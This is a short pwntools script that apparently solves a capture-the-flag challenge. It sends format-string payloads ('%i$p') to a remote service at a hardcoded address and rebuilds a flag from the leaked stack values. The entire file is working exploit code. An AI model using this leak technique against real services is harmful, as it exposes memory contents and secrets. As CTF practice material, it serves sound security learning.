#!/usr/bin/python3

from pwn import *
import sys
import struct

# change those
BINARY = './fmtstr'
LIBC = ''
HOST = '140.110.112.77'
PORT = 6127

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

flag = b''
for i in range(1,50):
    r = remote( HOST, PORT )
    r.sendline('%' + str(i) + '$p')
    res = r.recv()
    if len(res) % 2 == 0 and res[:2] == b'0x':
        res = bytes.fromhex(res[2:].decode())[::-1]
        flag += res
    r.close()
print(flag)
